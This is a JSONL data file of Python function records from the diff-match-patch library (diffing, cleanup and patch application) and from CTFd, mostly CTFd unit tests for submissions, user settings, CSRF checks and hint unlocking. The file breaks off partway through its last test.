{"docstring": "\"\"\"Find the differences between two texts.  Assumes that the texts do not\n  have any common prefix or suffix.\n\nArgs:\n  text1: Old string to be diffed.\n  text2: New string to be diffed.\n  checklines: Speedup flag.  If false, then don't run a line-level diff\n    first to identify the changed areas.\n    If true, then run a faster, slightly less optimal diff.\n  deadline: Time when the diff should be complete by.\n\nReturns:\n  Array of changes.\n\"\"\"\n", "func_signal": "def diff_compute(self, text1, text2, checklines, deadline):\n", "code": "if not text1:\n  # Just add some text (speedup).\n  return [(self.DIFF_INSERT, text2)]\n\nif not text2:\n  # Just delete some text (speedup).\n  return [(self.DIFF_DELETE, text1)]\n\nif len(text1) > len(text2):\n  (longtext, shorttext) = (text1, text2)\nelse:\n  (shorttext, longtext) = (text1, text2)\ni = longtext.find(shorttext)\nif i != -1:\n  # Shorter text is inside the longer text (speedup).\n  diffs = [(self.DIFF_INSERT, longtext[:i]), (self.DIFF_EQUAL, shorttext),\n           (self.DIFF_INSERT, longtext[i + len(shorttext):])]\n  # Swap insertions for deletions if diff is reversed.\n  if len(text1) > len(text2):\n    diffs[0] = (self.DIFF_DELETE, diffs[0][1])\n    diffs[2] = (self.DIFF_DELETE, diffs[2][1])\n  return diffs\n\nif len(shorttext) == 1:\n  # Single character string.\n  # After the previous speedup, the character can't be an equality.\n  return [(self.DIFF_DELETE, text1), (self.DIFF_INSERT, text2)]\n\n# Check to see if the problem can be split in two.\nhm = self.diff_halfMatch(text1, text2)\nif hm:\n  # A half-match was found, sort out the return data.\n  (text1_a, text1_b, text2_a, text2_b, mid_common) = hm\n  # Send both pairs off for separate processing.\n  diffs_a = self.diff_main(text1_a, text2_a, checklines, deadline)\n  diffs_b = self.diff_main(text1_b, text2_b, checklines, deadline)\n  # Merge the results.\n  return diffs_a + [(self.DIFF_EQUAL, mid_common)] + diffs_b\n\nif checklines and len(text1) > 100 and len(text2) > 100:\n  return self.diff_lineMode(text1, text2, deadline)\n\nreturn self.diff_bisect(text1, text2, deadline)", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Determine the common suffix of two strings.\n\nArgs:\n  text1: First string.\n  text2: Second string.\n\nReturns:\n  The number of characters common to the end of each string.\n\"\"\"\n# Quick check for common null cases.\n", "func_signal": "def diff_commonSuffix(self, text1, text2):\n", "code": "if not text1 or not text2 or text1[-1] != text2[-1]:\n  return 0\n# Binary search.\n# Performance analysis: https://neil.fraser.name/news/2007/10/09/\npointermin = 0\npointermax = min(len(text1), len(text2))\npointermid = pointermax\npointerend = 0\nwhile pointermin < pointermid:\n  if (text1[-pointermid:len(text1) - pointerend] ==\n      text2[-pointermid:len(text2) - pointerend]):\n    pointermin = pointermid\n    pointerend = pointermin\n  else:\n    pointermax = pointermid\n  pointermid = (pointermax - pointermin) // 2 + pointermin\nreturn pointermid", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Reorder and merge like edit sections.  Merge equalities.\nAny edit section can move as long as it doesn't cross an equality.\n\nArgs:\n  diffs: Array of diff tuples.\n\"\"\"\n", "func_signal": "def diff_cleanupMerge(self, diffs):\n", "code": "diffs.append((self.DIFF_EQUAL, ''))  # Add a dummy entry at the end.\npointer = 0\ncount_delete = 0\ncount_insert = 0\ntext_delete = ''\ntext_insert = ''\nwhile pointer < len(diffs):\n  if diffs[pointer][0] == self.DIFF_INSERT:\n    count_insert += 1\n    text_insert += diffs[pointer][1]\n    pointer += 1\n  elif diffs[pointer][0] == self.DIFF_DELETE:\n    count_delete += 1\n    text_delete += diffs[pointer][1]\n    pointer += 1\n  elif diffs[pointer][0] == self.DIFF_EQUAL:\n    # Upon reaching an equality, check for prior redundancies.\n    if count_delete + count_insert > 1:\n      if count_delete != 0 and count_insert != 0:\n        # Factor out any common prefixies.\n        commonlength = self.diff_commonPrefix(text_insert, text_delete)\n        if commonlength != 0:\n          x = pointer - count_delete - count_insert - 1\n          if x >= 0 and diffs[x][0] == self.DIFF_EQUAL:\n            diffs[x] = (diffs[x][0], diffs[x][1] +\n                        text_insert[:commonlength])\n          else:\n            diffs.insert(0, (self.DIFF_EQUAL, text_insert[:commonlength]))\n            pointer += 1\n          text_insert = text_insert[commonlength:]\n          text_delete = text_delete[commonlength:]\n        # Factor out any common suffixies.\n        commonlength = self.diff_commonSuffix(text_insert, text_delete)\n        if commonlength != 0:\n          diffs[pointer] = (diffs[pointer][0], text_insert[-commonlength:] +\n              diffs[pointer][1])\n          text_insert = text_insert[:-commonlength]\n          text_delete = text_delete[:-commonlength]\n      # Delete the offending records and add the merged ones.\n      new_ops = []\n      if len(text_delete) != 0:\n        new_ops.append((self.DIFF_DELETE, text_delete))\n      if len(text_insert) != 0:\n        new_ops.append((self.DIFF_INSERT, text_insert))\n      pointer -= count_delete + count_insert\n      diffs[pointer : pointer + count_delete + count_insert] = new_ops\n      pointer += len(new_ops) + 1\n    elif pointer != 0 and diffs[pointer - 1][0] == self.DIFF_EQUAL:\n      # Merge this equality with the previous one.\n      diffs[pointer - 1] = (diffs[pointer - 1][0],\n                            diffs[pointer - 1][1] + diffs[pointer][1])\n      del diffs[pointer]\n    else:\n      pointer += 1\n\n    count_insert = 0\n    count_delete = 0\n    text_delete = ''\n    text_insert = ''\n\nif diffs[-1][1] == '':\n  diffs.pop()  # Remove the dummy entry at the end.\n\n# Second pass: look for single edits surrounded on both sides by equalities\n# which can be shifted sideways to eliminate an equality.\n# e.g: A<ins>BA</ins>C -> <ins>AB</ins>AC\nchanges = False\npointer = 1\n# Intentionally ignore the first and last element (don't need checking).\nwhile pointer < len(diffs) - 1:\n  if (diffs[pointer - 1][0] == self.DIFF_EQUAL and\n      diffs[pointer + 1][0] == self.DIFF_EQUAL):\n    # This is a single edit surrounded by equalities.\n    if diffs[pointer][1].endswith(diffs[pointer - 1][1]):\n      # Shift the edit over the previous equality.\n      if diffs[pointer - 1][1] != \"\":\n        diffs[pointer] = (diffs[pointer][0],\n            diffs[pointer - 1][1] +\n            diffs[pointer][1][:-len(diffs[pointer - 1][1])])\n        diffs[pointer + 1] = (diffs[pointer + 1][0],\n                              diffs[pointer - 1][1] + diffs[pointer + 1][1])\n      del diffs[pointer - 1]\n      changes = True\n    elif diffs[pointer][1].startswith(diffs[pointer + 1][1]):\n      # Shift the edit over the next equality.\n      diffs[pointer - 1] = (diffs[pointer - 1][0],\n                            diffs[pointer - 1][1] + diffs[pointer + 1][1])\n      diffs[pointer] = (diffs[pointer][0],\n          diffs[pointer][1][len(diffs[pointer + 1][1]):] +\n          diffs[pointer + 1][1])\n      del diffs[pointer + 1]\n      changes = True\n  pointer += 1\n\n# If shifts were made, the diff needs reordering and another shift sweep.\nif changes:\n  self.diff_cleanupMerge(diffs)", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Given the location of the 'middle snake', split the diff in two parts\nand recurse.\n\nArgs:\n  text1: Old string to be diffed.\n  text2: New string to be diffed.\n  x: Index of split point in text1.\n  y: Index of split point in text2.\n  deadline: Time at which to bail if not yet complete.\n\nReturns:\n  Array of diff tuples.\n\"\"\"\n", "func_signal": "def diff_bisectSplit(self, text1, text2, x, y, deadline):\n", "code": "text1a = text1[:x]\ntext2a = text2[:y]\ntext1b = text1[x:]\ntext2b = text2[y:]\n\n# Compute both diffs serially.\ndiffs = self.diff_main(text1a, text2a, False, deadline)\ndiffsb = self.diff_main(text1b, text2b, False, deadline)\n\nreturn diffs + diffsb", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Increase the context until it is unique,\nbut don't let the pattern expand beyond Match_MaxBits.\n\nArgs:\n  patch: The patch to grow.\n  text: Source text.\n\"\"\"\n", "func_signal": "def patch_addContext(self, patch, text):\n", "code": "if len(text) == 0:\n  return\npattern = text[patch.start2 : patch.start2 + patch.length1]\npadding = 0\n\n# Look for the first and last matches of pattern in text.  If two different\n# matches are found, increase the pattern length.\nwhile (text.find(pattern) != text.rfind(pattern) and (self.Match_MaxBits ==\n    0 or len(pattern) < self.Match_MaxBits - self.Patch_Margin -\n    self.Patch_Margin)):\n  padding += self.Patch_Margin\n  pattern = text[max(0, patch.start2 - padding) :\n                 patch.start2 + patch.length1 + padding]\n# Add one chunk for good luck.\npadding += self.Patch_Margin\n\n# Add the prefix.\nprefix = text[max(0, patch.start2 - padding) : patch.start2]\nif prefix:\n  patch.diffs[:0] = [(self.DIFF_EQUAL, prefix)]\n# Add the suffix.\nsuffix = text[patch.start2 + patch.length1 :\n              patch.start2 + patch.length1 + padding]\nif suffix:\n  patch.diffs.append((self.DIFF_EQUAL, suffix))\n\n# Roll back the start points.\npatch.start1 -= len(prefix)\npatch.start2 -= len(prefix)\n# Extend lengths.\npatch.length1 += len(prefix) + len(suffix)\npatch.length2 += len(prefix) + len(suffix)", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Merge a set of patches onto the text.  Return a patched text, as well\nas a list of true/false values indicating which patches were applied.\n\nArgs:\n  patches: Array of Patch objects.\n  text: Old text.\n\nReturns:\n  Two element Array, containing the new text and an array of boolean values.\n\"\"\"\n", "func_signal": "def patch_apply(self, patches, text):\n", "code": "if not patches:\n  return (text, [])\n\n# Deep copy the patches so that no changes are made to originals.\npatches = self.patch_deepCopy(patches)\n\nnullPadding = self.patch_addPadding(patches)\ntext = nullPadding + text + nullPadding\nself.patch_splitMax(patches)\n\n# delta keeps track of the offset between the expected and actual location\n# of the previous patch.  If there are patches expected at positions 10 and\n# 20, but the first patch was found at 12, delta is 2 and the second patch\n# has an effective expected position of 22.\ndelta = 0\nresults = []\nfor patch in patches:\n  expected_loc = patch.start2 + delta\n  text1 = self.diff_text1(patch.diffs)\n  end_loc = -1\n  if len(text1) > self.Match_MaxBits:\n    # patch_splitMax will only provide an oversized pattern in the case of\n    # a monster delete.\n    start_loc = self.match_main(text, text1[:self.Match_MaxBits],\n                                expected_loc)\n    if start_loc != -1:\n      end_loc = self.match_main(text, text1[-self.Match_MaxBits:],\n          expected_loc + len(text1) - self.Match_MaxBits)\n      if end_loc == -1 or start_loc >= end_loc:\n        # Can't find valid trailing context.  Drop this patch.\n        start_loc = -1\n  else:\n    start_loc = self.match_main(text, text1, expected_loc)\n  if start_loc == -1:\n    # No match found.  :(\n    results.append(False)\n    # Subtract the delta for this failed patch from subsequent patches.\n    delta -= patch.length2 - patch.length1\n  else:\n    # Found a match.  :)\n    results.append(True)\n    delta = start_loc - expected_loc\n    if end_loc == -1:\n      text2 = text[start_loc : start_loc + len(text1)]\n    else:\n      text2 = text[start_loc : end_loc + self.Match_MaxBits]\n    if text1 == text2:\n      # Perfect match, just shove the replacement text in.\n      text = (text[:start_loc] + self.diff_text2(patch.diffs) +\n                  text[start_loc + len(text1):])\n    else:\n      # Imperfect match.\n      # Run a diff to get a framework of equivalent indices.\n      diffs = self.diff_main(text1, text2, False)\n      if (len(text1) > self.Match_MaxBits and\n          self.diff_levenshtein(diffs) / float(len(text1)) >\n          self.Patch_DeleteThreshold):\n        # The end points match, but the content is unacceptably bad.\n        results[-1] = False\n      else:\n        self.diff_cleanupSemanticLossless(diffs)\n        index1 = 0\n        for (op, data) in patch.diffs:\n          if op != self.DIFF_EQUAL:\n            index2 = self.diff_xIndex(diffs, index1)\n          if op == self.DIFF_INSERT:  # Insertion\n            text = text[:start_loc + index2] + data + text[start_loc +\n                                                           index2:]\n          elif op == self.DIFF_DELETE:  # Deletion\n            text = text[:start_loc + index2] + text[start_loc +\n                self.diff_xIndex(diffs, index1 + len(data)):]\n          if op != self.DIFF_DELETE:\n            index1 += len(data)\n# Strip the padding off.\ntext = text[len(nullPadding):-len(nullPadding)]\nreturn (text, results)", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Do the two texts share a substring which is at least half the length of\nthe longer text?\nThis speedup can produce non-minimal diffs.\n\nArgs:\n  text1: First string.\n  text2: Second string.\n\nReturns:\n  Five element Array, containing the prefix of text1, the suffix of text1,\n  the prefix of text2, the suffix of text2 and the common middle.  Or None\n  if there was no match.\n\"\"\"\n", "func_signal": "def diff_halfMatch(self, text1, text2):\n", "code": "if self.Diff_Timeout <= 0:\n  # Don't risk returning a non-optimal diff if we have unlimited time.\n  return None\nif len(text1) > len(text2):\n  (longtext, shorttext) = (text1, text2)\nelse:\n  (shorttext, longtext) = (text1, text2)\nif len(longtext) < 4 or len(shorttext) * 2 < len(longtext):\n  return None  # Pointless.\n\ndef diff_halfMatchI(longtext, shorttext, i):\n  \"\"\"Does a substring of shorttext exist within longtext such that the\n  substring is at least half the length of longtext?\n  Closure, but does not reference any external variables.\n\n  Args:\n    longtext: Longer string.\n    shorttext: Shorter string.\n    i: Start index of quarter length substring within longtext.\n\n  Returns:\n    Five element Array, containing the prefix of longtext, the suffix of\n    longtext, the prefix of shorttext, the suffix of shorttext and the\n    common middle.  Or None if there was no match.\n  \"\"\"\n  seed = longtext[i:i + len(longtext) // 4]\n  best_common = ''\n  j = shorttext.find(seed)\n  while j != -1:\n    prefixLength = self.diff_commonPrefix(longtext[i:], shorttext[j:])\n    suffixLength = self.diff_commonSuffix(longtext[:i], shorttext[:j])\n    if len(best_common) < suffixLength + prefixLength:\n      best_common = (shorttext[j - suffixLength:j] +\n          shorttext[j:j + prefixLength])\n      best_longtext_a = longtext[:i - suffixLength]\n      best_longtext_b = longtext[i + prefixLength:]\n      best_shorttext_a = shorttext[:j - suffixLength]\n      best_shorttext_b = shorttext[j + prefixLength:]\n    j = shorttext.find(seed, j + 1)\n\n  if len(best_common) * 2 >= len(longtext):\n    return (best_longtext_a, best_longtext_b,\n            best_shorttext_a, best_shorttext_b, best_common)\n  else:\n    return None\n\n# First check if the second quarter is the seed for a half-match.\nhm1 = diff_halfMatchI(longtext, shorttext, (len(longtext) + 3) // 4)\n# Check again based on the third quarter.\nhm2 = diff_halfMatchI(longtext, shorttext, (len(longtext) + 1) // 2)\nif not hm1 and not hm2:\n  return None\nelif not hm2:\n  hm = hm1\nelif not hm1:\n  hm = hm2\nelse:\n  # Both matched.  Select the longest.\n  if len(hm1[4]) > len(hm2[4]):\n    hm = hm1\n  else:\n    hm = hm2\n\n# A half-match was found, sort out the return data.\nif len(text1) > len(text2):\n  (text1_a, text1_b, text2_a, text2_b, mid_common) = hm\nelse:\n  (text2_a, text2_b, text1_a, text1_b, mid_common) = hm\nreturn (text1_a, text1_b, text2_a, text2_b, mid_common)", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Emulate GNU diff's format.\nHeader: @@ -382,8 +481,9 @@\nIndices are printed as 1-based, not 0-based.\n\nReturns:\n  The GNU diff string.\n\"\"\"\n", "func_signal": "def __str__(self):\n", "code": "if self.length1 == 0:\n  coords1 = str(self.start1) + \",0\"\nelif self.length1 == 1:\n  coords1 = str(self.start1 + 1)\nelse:\n  coords1 = str(self.start1 + 1) + \",\" + str(self.length1)\nif self.length2 == 0:\n  coords2 = str(self.start2) + \",0\"\nelif self.length2 == 1:\n  coords2 = str(self.start2 + 1)\nelse:\n  coords2 = str(self.start2 + 1) + \",\" + str(self.length2)\ntext = [\"@@ -\", coords1, \" +\", coords2, \" @@\\n\"]\n# Escape the body of the patch with %xx notation.\nfor (op, data) in self.diffs:\n  if op == diff_match_patch.DIFF_INSERT:\n    text.append(\"+\")\n  elif op == diff_match_patch.DIFF_DELETE:\n    text.append(\"-\")\n  elif op == diff_match_patch.DIFF_EQUAL:\n    text.append(\" \")\n  # High ascii will raise UnicodeDecodeError.  Use Unicode instead.\n  data = data.encode(\"utf-8\")\n  text.append(urllib.parse.quote(data, \"!~*'();/?:@&=+$,# \") + \"\\n\")\nreturn \"\".join(text)", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Take a list of patches and return a textual representation.\n\nArgs:\n  patches: Array of Patch objects.\n\nReturns:\n  Text representation of patches.\n\"\"\"\n", "func_signal": "def patch_toText(self, patches):\n", "code": "text = []\nfor patch in patches:\n  text.append(str(patch))\nreturn \"\".join(text)", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Reduce the number of edits by eliminating semantically trivial\nequalities.\n\nArgs:\n  diffs: Array of diff tuples.\n\"\"\"\n", "func_signal": "def diff_cleanupSemantic(self, diffs):\n", "code": "changes = False\nequalities = []  # Stack of indices where equalities are found.\nlastEquality = None  # Always equal to diffs[equalities[-1]][1]\npointer = 0  # Index of current position.\n# Number of chars that changed prior to the equality.\nlength_insertions1, length_deletions1 = 0, 0\n# Number of chars that changed after the equality.\nlength_insertions2, length_deletions2 = 0, 0\nwhile pointer < len(diffs):\n  if diffs[pointer][0] == self.DIFF_EQUAL:  # Equality found.\n    equalities.append(pointer)\n    length_insertions1, length_insertions2 = length_insertions2, 0\n    length_deletions1, length_deletions2 = length_deletions2, 0\n    lastEquality = diffs[pointer][1]\n  else:  # An insertion or deletion.\n    if diffs[pointer][0] == self.DIFF_INSERT:\n      length_insertions2 += len(diffs[pointer][1])\n    else:\n      length_deletions2 += len(diffs[pointer][1])\n    # Eliminate an equality that is smaller or equal to the edits on both\n    # sides of it.\n    if (lastEquality and (len(lastEquality) <=\n        max(length_insertions1, length_deletions1)) and\n        (len(lastEquality) <= max(length_insertions2, length_deletions2))):\n      # Duplicate record.\n      diffs.insert(equalities[-1], (self.DIFF_DELETE, lastEquality))\n      # Change second copy to insert.\n      diffs[equalities[-1] + 1] = (self.DIFF_INSERT,\n          diffs[equalities[-1] + 1][1])\n      # Throw away the equality we just deleted.\n      equalities.pop()\n      # Throw away the previous equality (it needs to be reevaluated).\n      if len(equalities):\n        equalities.pop()\n      if len(equalities):\n        pointer = equalities[-1]\n      else:\n        pointer = -1\n      # Reset the counters.\n      length_insertions1, length_deletions1 = 0, 0\n      length_insertions2, length_deletions2 = 0, 0\n      lastEquality = None\n      changes = True\n  pointer += 1\n\n# Normalize the diff.\nif changes:\n  self.diff_cleanupMerge(diffs)\nself.diff_cleanupSemanticLossless(diffs)\n\n# Find any overlaps between deletions and insertions.\n# e.g: <del>abcxxx</del><ins>xxxdef</ins>\n#   -> <del>abc</del>xxx<ins>def</ins>\n# e.g: <del>xxxabc</del><ins>defxxx</ins>\n#   -> <ins>def</ins>xxx<del>abc</del>\n# Only extract an overlap if it is as big as the edit ahead or behind it.\npointer = 1\nwhile pointer < len(diffs):\n  if (diffs[pointer - 1][0] == self.DIFF_DELETE and\n      diffs[pointer][0] == self.DIFF_INSERT):\n    deletion = diffs[pointer - 1][1]\n    insertion = diffs[pointer][1]\n    overlap_length1 = self.diff_commonOverlap(deletion, insertion)\n    overlap_length2 = self.diff_commonOverlap(insertion, deletion)\n    if overlap_length1 >= overlap_length2:\n      if (overlap_length1 >= len(deletion) / 2.0 or\n          overlap_length1 >= len(insertion) / 2.0):\n        # Overlap found.  Insert an equality and trim the surrounding edits.\n        diffs.insert(pointer, (self.DIFF_EQUAL,\n                               insertion[:overlap_length1]))\n        diffs[pointer - 1] = (self.DIFF_DELETE,\n                              deletion[:len(deletion) - overlap_length1])\n        diffs[pointer + 1] = (self.DIFF_INSERT,\n                              insertion[overlap_length1:])\n        pointer += 1\n    else:\n      if (overlap_length2 >= len(deletion) / 2.0 or\n          overlap_length2 >= len(insertion) / 2.0):\n        # Reverse overlap found.\n        # Insert an equality and swap and trim the surrounding edits.\n        diffs.insert(pointer, (self.DIFF_EQUAL, deletion[:overlap_length2]))\n        diffs[pointer - 1] = (self.DIFF_INSERT,\n                              insertion[:len(insertion) - overlap_length2])\n        diffs[pointer + 1] = (self.DIFF_DELETE, deletion[overlap_length2:])\n        pointer += 1\n    pointer += 1\n  pointer += 1", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Compute the Levenshtein distance; the number of inserted, deleted or\nsubstituted characters.\n\nArgs:\n  diffs: Array of diff tuples.\n\nReturns:\n  Number of changes.\n\"\"\"\n", "func_signal": "def diff_levenshtein(self, diffs):\n", "code": "levenshtein = 0\ninsertions = 0\ndeletions = 0\nfor (op, data) in diffs:\n  if op == self.DIFF_INSERT:\n    insertions += len(data)\n  elif op == self.DIFF_DELETE:\n    deletions += len(data)\n  elif op == self.DIFF_EQUAL:\n    # A deletion and an insertion is one substitution.\n    levenshtein += max(insertions, deletions)\n    insertions = 0\n    deletions = 0\nlevenshtein += max(insertions, deletions)\nreturn levenshtein", "path": "diff-match-patch/python3/diff_match_patch.py", "commit_date": "2019-07-25 00:00:00", "repo_name": "google/diff-match-patch", "stars": 6987, "license": "apache-2.0", "language": "python", "size": 675}
{"docstring": "\"\"\"Can a user post /api/v1/submissions if admin\"\"\"\n", "func_signal": "def test_api_submissions_post_admin():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    gen_challenge(app.db)\n    with login_as_user(app, name=\"admin\") as client:\n        r = client.post(\n            \"/api/v1/submissions\",\n            json={\n                \"provided\": \"MARKED AS SOLVED BY ADMIN\",\n                \"user_id\": 1,\n                \"team_id\": None,\n                \"challenge_id\": \"1\",\n                \"type\": \"correct\",\n            },\n        )\n        assert r.status_code == 200\ndestroy_ctfd(app)", "path": "CTFd/tests/api/v1/test_submissions.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Can a user patch /api/v1/submissions/<submission_id> if admin\"\"\"\n", "func_signal": "def test_api_submission_delete_admin():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    gen_solve(app.db, user_id=1)\n    with login_as_user(app, \"admin\") as client:\n        r = client.delete(\"/api/v1/submissions/1\", json=\"\")\n        assert r.status_code == 200\n        assert r.get_json().get(\"data\") is None\ndestroy_ctfd(app)", "path": "CTFd/tests/api/v1/test_submissions.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "# We only care about content.\n# Loading other attributes improperly will cause Marshmallow to incorrectly return a dict\n", "func_signal": "def pages_preview():\n", "code": "data = {\"content\": request.form.get(\"content\")}\nschema = PageSchema()\npage = schema.load(data)\nreturn render_template(\"page.html\", content=build_html(page.data.content))", "path": "CTFd/CTFd/admin/pages.py", "commit_date": "2020-07-24 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Test that a user can set and remove their information in their profile\"\"\"\n", "func_signal": "def test_user_set_profile():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    register_user(app)\n    client = login_as_user(app)\n\n    data = {\n        \"name\": \"user\",\n        \"email\": \"user@ctfd.io\",\n        \"confirm\": \"\",\n        \"password\": \"\",\n        \"affiliation\": \"affiliation_test\",\n        \"website\": \"https://ctfd.io\",\n        \"country\": \"US\",\n    }\n\n    r = client.patch(\"/api/v1/users/me\", json=data)\n    assert r.status_code == 200\n\n    user = Users.query.filter_by(id=2).first()\n    assert user.affiliation == data[\"affiliation\"]\n    assert user.website == data[\"website\"]\n    assert user.country == data[\"country\"]\n\n    r = client.get(\"/settings\")\n    resp = r.get_data(as_text=True)\n    for k, v in data.items():\n        assert v in resp\n\n    data = {\n        \"name\": \"user\",\n        \"email\": \"user@ctfd.io\",\n        \"confirm\": \"\",\n        \"password\": \"\",\n        \"affiliation\": \"\",\n        \"website\": \"\",\n        \"country\": \"\",\n    }\n\n    r = client.patch(\"/api/v1/users/me\", json=data)\n    assert r.status_code == 200\n\n    user = Users.query.filter_by(id=2).first()\n    assert user.affiliation == data[\"affiliation\"]\n    assert user.website == data[\"website\"]\n    assert user.country == data[\"country\"]\ndestroy_ctfd(app)", "path": "CTFd/tests/users/test_settings.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Test that a user can change their password and is prompted properly\"\"\"\n", "func_signal": "def test_user_can_change_password():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    register_user(app)\n    client = login_as_user(app)\n\n    data = {\n        \"name\": \"user\",\n        \"email\": \"user@ctfd.io\",\n        \"confirm\": \"\",\n        \"password\": \"new_password\",\n        \"affiliation\": \"\",\n        \"website\": \"\",\n        \"country\": \"\",\n    }\n\n    r = client.patch(\"/api/v1/users/me\", json=data)\n    user = Users.query.filter_by(id=2).first()\n    assert verify_password(data[\"password\"], user.password) is False\n    assert r.status_code == 400\n    assert r.get_json() == {\n        \"errors\": {\"confirm\": [\"Please confirm your current password\"]},\n        \"success\": False,\n    }\n\n    data[\"confirm\"] = \"wrong_password\"\n\n    r = client.patch(\"/api/v1/users/me\", json=data)\n    user = Users.query.filter_by(id=2).first()\n    assert verify_password(data[\"password\"], user.password) is False\n    assert r.status_code == 400\n    assert r.get_json() == {\n        \"errors\": {\"confirm\": [\"Your previous password is incorrect\"]},\n        \"success\": False,\n    }\n\n    data[\"confirm\"] = \"password\"\n    r = client.patch(\"/api/v1/users/me\", json=data)\n    assert r.status_code == 200\n    user = Users.query.filter_by(id=2).first()\n    assert verify_password(data[\"password\"], user.password) is True\ndestroy_ctfd(app)", "path": "CTFd/tests/users/test_settings.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Test that API requests require the CSRF-Token header\"\"\"\n", "func_signal": "def test_api_csrf_failure():\n", "code": "app = create_ctfd()\napp.test_client_class = FlaskClient\nwith app.app_context():\n    with login_as_user(app, \"admin\") as client:\n        r = client.post(\n            \"/api/v1/challenges\",\n            json={\n                \"name\": \"chal\",\n                \"category\": \"cate\",\n                \"description\": \"desc\",\n                \"value\": \"100\",\n                \"state\": \"hidden\",\n                \"type\": \"standard\",\n            },\n        )\n        assert r.status_code == 403\n\n        with client.session_transaction() as sess:\n            nonce = sess.get(\"nonce\")\n\n        r = client.post(\n            \"/api/v1/challenges\",\n            headers={\"CSRF-Token\": nonce},\n            json={\n                \"name\": \"chal\",\n                \"category\": \"cate\",\n                \"description\": \"desc\",\n                \"value\": \"100\",\n                \"state\": \"hidden\",\n                \"type\": \"standard\",\n            },\n        )\n        assert r.status_code == 200\ndestroy_ctfd(app)", "path": "CTFd/tests/api/v1/test_csrf.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Test that a user can't unlock a hint if they don't have enough points\"\"\"\n", "func_signal": "def test_user_cannot_unlock_hint():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    with app.test_client():\n        register_user(app, name=\"user1\", email=\"user1@ctfd.io\")\n\n        chal = gen_challenge(app.db, value=100)\n        chal_id = chal.id\n\n        gen_flag(app.db, challenge_id=chal.id, content=\"flag\")\n\n        hint = gen_hint(db, chal_id, cost=10)\n        hint_id = hint.id\n\n        client = login_as_user(app, name=\"user1\", password=\"password\")\n\n        with client.session_transaction():\n            r = client.get(\"/api/v1/hints/{}\".format(hint_id))\n            resp = r.get_json()\n            assert resp[\"data\"].get(\"content\") is None\n            assert resp[\"data\"].get(\"cost\") == 10\ndestroy_ctfd(app)", "path": "CTFd/tests/users/test_hints.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Test that hints are not unlocked if the CTF hasn't begun\"\"\"\n", "func_signal": "def test_unlocking_hints_with_cost_before_ctf():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    register_user(app)\n    chal = gen_challenge(app.db)\n    chal_id = chal.id\n    gen_hint(app.db, chal_id)\n    gen_award(app.db, user_id=2)\n\n    set_config(\n        \"start\", \"1507089600\"\n    )  # Wednesday, October 4, 2017 12:00:00 AM GMT-04:00 DST\n    set_config(\n        \"end\", \"1507262400\"\n    )  # Friday, October 6, 2017 12:00:00 AM GMT-04:00 DST\n\n    with freeze_time(\"2017-10-1\"):\n        client = login_as_user(app)\n\n        r = client.get(\"/api/v1/hints/1\")\n        assert r.status_code == 403\n        assert r.get_json().get(\"data\") is None\n\n        r = client.post(\"/api/v1/unlocks\", json={\"target\": 1, \"type\": \"hints\"})\n        assert r.status_code == 403\n        assert r.get_json().get(\"data\") is None\n\n        r = client.get(\"/api/v1/hints/1\")\n        assert r.get_json().get(\"data\") is None\n        assert 